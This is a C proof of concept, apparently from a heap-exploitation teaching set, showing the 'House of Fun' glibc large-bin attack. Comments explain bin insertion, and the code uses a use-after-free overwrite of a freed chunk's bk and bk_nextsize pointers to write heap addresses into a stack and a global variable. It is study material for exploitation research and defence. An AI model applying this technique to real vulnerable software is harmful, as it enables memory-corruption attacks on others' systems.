#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>


char *global_var; // target 2
/*
   House of Fun uses a UAF on a chunk present in the large bin, to overwrite the
   backward pointer so that the pointer of the next chunk that is to be linked
   to the same large bin is in an arbitary location.  
credit: https://www.alchemistowl.org/pocorgtfo/pocorgtfo18.pdf; pages 22-36
*/

int main() {
	/*
	   This exploitation techinque is not applicable to small bin chunks as
	   freed chunks are inserted right at the head. Controlling the
	   backward pointer of the head, which is a libc pointer, is difficult
	   or there are better targets within the libc from an exploitation
	   point of view.

	   Large bins hold chunks of a range of sizes. 
	   For eg: freed chunks of 0x500, 0x510, 0x520 and 0x530 sizes are inserted into
	   the same bin. For the sake of efficieny, large bins are maintained
	   sorted on each insertion. The first chunk of each size has a
	   fd_nextsize and bk_nextsize that holds the pointer to first chunk of
	   next and previous size respectively.


                                              
		     ptr_5          ptr_6        bin_head	  ptr_1          ptr_2          ptr_3          ptr_4	
		   +-------<<---+ +---+---+<<--+ +-------+<<--+ +-------+<<--+ +-------+<<--+ +-------+<<--+ +-------+
prev_size	   |       |    | |       |    | |       |    | |       |    | |       |    | |       |    | |       |
		   +-------+    | +-------+    | +-------+    | +-------+    | +-------+    | +-------+    | +-------+
size		   | 0x500 |    | | 0x500 |    | |       |    | | 0x520 |    | | 0x520 |    | | 0x510 |    | | 0x510 |
		   +-------+    | +-------+    | +-------+    | +-------+    | +-------+    | +-------+    | +-------+
fd		   | ptr_6 +    | | ptr_0 |    | | ptr_1 |    | | ptr_2 |    | | ptr_3 |    | | ptr_4 |    | | ptr_5 |
		   +-------+    | +-------+    | +-------+    | +-------+    | +-------+    | +-------+    | +-------+
bk		   | ptr_4 |    +-+ ptr_5 |    +-+ ptr_6 |    +-+ ptr_0 |    +-+ ptr_1 |    +-+ ptr_2 |    +-+ ptr_3 |
		   +-------+      +-------+      +-------+      +-------+      +-------+      +-------+      +-------+
fd_nextsize	   | ptr_1 +>+    |       |      |       |      | ptr_3 +>+    |       |      | ptr_5 +>+    |       |
		   +-------+ |    +-------+      +-------+      +-------+ |    +-------+      +-------+ |    +-------+
bk_nextsize    +-<-+ ptr_3 | |    |       |      |       |  +-<-+ ptr_5 | |    |       |  +-<-+ ptr_1 | |    |       |
	       |   +--+--+-+ |    +-------+      +-------+  |   +--+--+-+ |    +-------+  |   +--+--+-+ |    +-------+
               |      ^  ^   |                              |      ^  ^   |               |      ^  ^   |
               |      |  |   +------------>-----------------+->----+  |   +-->------------+------+  |   |
               |      |  |                                  |         |                   |         |   |
               |      |  +---------<------------------------+         +-------------------+         |   |
               |      |                                                                             |   |
               +------|-------------------->--------------------------------------------------------+   |
                      +---------------------------------------------<-----------------------------------+


	   Insertion of the victim into large bin can be divided into two parts, (i) deciding
	   where to insert victim chunk (ii) insertion into bin. 
	   Chunks are in descending order when traversed forward


	   victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;

              if (fwd != bck) // if bin not empty
              // If empty, victim is inserted right away

               {
                 // Or with inuse bit to speed comparisons 
                 size |= PREV_INUSE;
                 assert (chunk_main_arena (bck->bk));


                 if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))
    		// If the victim chunk to be inserted is smaller than the smallest
		   chunk in the bin then it will be inserted behind the head. Else the
		   bin will be traversed forward to find the first chunk that is not
		   smaller than the victim. 

                  {
                     fwd = bck;
                     bck = bck->bk;
                     victim->fd_nextsize = fwd->fd;
                     victim->bk_nextsize = fwd->fd->bk_nextsize;
                     fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                   }
                 else
                   {
                     assert (chunk_main_arena (fwd));
                     while ((unsigned long) size < chunksize_nomask (fwd))
                       {
                         fwd = fwd->fd_nextsize;
                         assert (chunk_main_arena (fwd));
                       }
                     if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))
		//  If the chunk found is of same size, then
		   victim will be inserted at the second position. Here fwd is
		   set as the next chunk. bck is set as fwd->bk.
		   If an attacker overwrites the bk of the fwd then,
		   victim pointer can be written to arbitary location.    
                                                                                      
                       fwd = fwd->fd;                                                
                     else                                                            
		// The next case is when the victim size is not present in the
		   bin and has size greater than fwd when exiting the while loop.
		   When a new size is being inserted into the bin, the
		   fd_nextsize and bk_nextsize is also set. Apart from
		   overwriting the fwd->bk, we can also overwrite
		   fwd->bk_nextsize, to get the victim pointer in two arbitary
		   locations.                                         

                       {                                                         
                         victim->fd_nextsize = fwd;                             
                         victim->bk_nextsize = fwd->bk_nextsize;                
                         fwd->bk_nextsize = victim;                              
                         victim->bk_nextsize->fd_nextsize = victim;              
                       }                                                         
                     bck = fwd->bk;               
                   }                                                             
               }                                                                 
             else                                                                
               victim->fd_nextsize = victim->bk_nextsize = victim;               
           }                                                                     
          mark_bin (av, victim_index);                                           
          victim->bk = bck;                                                      
          victim->fd = fwd;                                                      
          fwd->bk = victim;                                                      
          bck->fd = victim;  
	   */


	   /* In this POC we are going to set two arbitary
	      locations with a heap pointer. 
	      We have two targets, a stack variable and a global variable in bss.
	      */

	   char  *p1, *p2;
	   char *stack_var; // target 1
	   printf("Target 1 = %p\n",&stack_var);
	   printf("Target 2 = %p\n",&global_var);
	   /*
	      first allocate a chunk of size > 0x410.
	      */

	   p1 = malloc(0x4f0);
	   printf("Allocated p1 = %p of 0x%x size\n",p1,*(int *)(p1-0x8));

	   malloc(0x100); // to prevent consolidation when p2 is freed

	   /* 
	      Allocate another chunk p2, such that size is greater than the p1.
	      Both p1 and p2 will be inserted to the same large bin if sorted
	      off the unsorted bin. 
	      */

	   p2 = malloc(0x500);
	   printf("Allocated p2 = %p of 0x%x size\n",p2,*(int *)(p2-0x8));

	   malloc(0x100); // to prevent consolidation with top chunk

	   /* 
	      There are two main allocations, p1 of 0x500 and p2 of 0x510 sizes.
	      Free p1. p1 will be inserted into the unsorted bin.
	      */

	   free(p1); 
	   printf("Freed %p\n",(void *)p1);

	   /*
	      Allocate chunk such that it cannot be serviced from unsorted bin
	      or split from small bin or large bin. This allocation will sort
	      p1 of size 0x500, to its respective large bin.
	      */

	   malloc(0x600);


	   /* 
	      Free p2, p2 will be inserted into unsorted bin.
	      */

	   free(p2);
	   printf("Freed %p\n",(void *)p2);

	   /* Now that p1 is in the large bin, let's insert p2 into the same
	      large bin and perform the attack. When p2 is being sorted to large
	      bin, it is neither the first chunk nor the smallest chunk. 
	      fwd will be p1 when the while loop exits and insertion is done.

		      p2->bk_nextsize = p1->bk_nextsize;
		      p2->bk_nextsize->fd_nextsize = p2;

		      bck = p1->bk 
		      bck->fd = p2;

	      Overwrite p2->bk and p2->bk_nextsize to get victim poionter in arbitary location.
	      */

	   *(size_t *)(p1+0x8) = (size_t)(&stack_var)-0x10;
	   *(size_t *)(p1+0x18) = (size_t)(&global_var)-0x20;

	   /*
	      Allocation to insert p2 into large bin and perforrm house of fun.
	      */

	   malloc(0x600);
	   
	   printf("Target 1 %p contains %p\n",&stack_var, (void *)stack_var);
	   printf("Target 2 %p contains %p\n",&global_var, (void *)global_var);




	   return 0;
	   }
